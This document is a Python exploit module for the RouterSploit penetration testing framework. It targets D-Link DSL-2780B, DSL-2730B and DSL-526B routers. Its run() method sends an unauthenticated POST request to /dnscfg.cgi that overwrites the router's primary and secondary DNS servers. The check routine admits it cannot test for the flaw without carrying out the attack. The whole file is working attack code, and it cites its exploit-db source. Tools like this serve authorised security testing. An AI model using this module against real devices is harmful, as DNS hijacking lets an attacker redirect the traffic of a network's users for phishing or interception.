from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "D-Link DSL-2780B & DSL-2730B & DSL-526B DNS Change",
        "description": "Module exploits D-Link DSL-2780B, DSL-2730B and DSL-526B dns change vulnerability. "
                       "If the target is vulnerable it is possible to change dns settings.",
        "authors": (
            "Todor Donev <todor.doven[at]gmail.com>",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://www.exploit-db.com/exploits/37237/",
            "https://github.com/jh00nbr/Routerhunter-2.0",
        ),
        "devices": (
            "D-Link DSL-2780B",
            "D-Link DSL-2730B",
            "D-Link DSL-526B",
        )
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    dns1 = OptString("8.8.8.8", "Primary DNS Server")
    dns2 = OptString("8.8.4.4", "Seconary DNS Server")

    def run(self):
        path = "/dnscfg.cgi?dnsPrimary={}&dnsSecondary={}&dnsDynamic=0&dnsRefresh=1&dnsIfcsList=".format(self.dns1,
                                                                                                         self.dns2)

        print_status("Attempting to change DNS settings...")
        print_status("Primary DNS: {}".format(self.dns1))
        print_status("Secondary DNS: {}".format(self.dns2))

        response = self.http_request(
            method="POST",
            path=path
        )
        if response is None:
            return

        if response.status_code == 200:
            print_success("DNS settings has been changed")
        else:
            print_error("Could not change DNS settings")

    @mute
    def check(self):
        # it is not possible to check if the target is vulnerable without exploiting device (changing dns)
        return None
